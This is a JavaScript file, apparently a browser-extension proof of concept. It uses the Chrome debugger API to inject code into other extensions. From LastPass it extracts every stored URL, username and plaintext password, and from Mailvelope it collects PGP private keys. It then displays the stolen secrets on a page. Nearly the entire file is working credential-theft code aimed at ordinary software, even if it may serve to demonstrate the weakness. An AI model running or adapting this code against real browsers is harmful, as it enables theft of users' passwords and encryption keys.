const CDP_VERSION = '1.3'

/**
 * Evaluate in extension's background page
 * @template T
 * @param  {string}     extensionId Extension ID
 * @param  {() => T}    fn          Function to evaluate
 * @return {Promise<T>}             Response
 */
async function evaluateInExtension(extensionId, fn) {
    await chrome.debugger.attach({extensionId}, CDP_VERSION)
    const {result} = await chrome.debugger.sendCommand({extensionId}, 'Runtime.evaluate', {
        expression: `(${fn.toString()})()`,
        awaitPromise: true,
        returnByValue: true
    })
    await chrome.debugger.detach({extensionId}, CDP_VERSION)
    return result.value
}

/**
 * Get LastPass secrets
 * @return {Promise<{url: string, username: string, password: string}[]>} Found secrets
 */
async function getLastpassSecrets() {
    return await evaluateInExtension('hdokiejnpimakedhajhdlcegeplioahd', () => {
        const data = []
        for (const i in g_sites) {
            data.push({
                url: g_sites[i].url,
                username: getusernamefromacct(g_sites[i]),
                password: getpasswordfromacct(g_sites[i])
            })
        }
        return data
    })
}

/**
 * Get Mailvelope secrets
 * @return {Promise<string[]>} Found secrets
 */
async function getMailvelopeSecrets() {
    return await evaluateInExtension('kajibbejlbohfaggdiogboambcijhkke', () => {
        return new Promise(resolve => {
            chrome.storage.local.get(null, items => {
                const data = Object.entries(items)
                    .filter(([key, value]) => key.match(/^mvelo\.keyring\..+\.privateKeys$/))
                    .map(([key, value]) => value)
                    .flat()
                resolve(data)
            })
        })
    })
}

(async () => {
    const $main = document.querySelector('main')

    // LastPass
    $main.innerHTML += '<h1>LastPass</h1>'
    try {
        const secrets = await getLastpassSecrets()
        $main.innerHTML += `<pre>${JSON.stringify(secrets, null, 2)}</pre>`
    } catch (e) {
        $main.innerHTML += `<p>Failed to get secrets: <em>${e.message}</em></p>`
    }

    // Mailvelope
    $main.innerHTML += '<h1>Mailvelope</h1>'
    try {
        const secrets = await getMailvelopeSecrets()
        for (const secret of secrets) {
            $main.innerHTML += `<pre>${secret}</pre>`
        }
    } catch (e) {
        $main.innerHTML += `<p>Failed to get secrets: <em>${e.message}</em></p>`
    }
})()
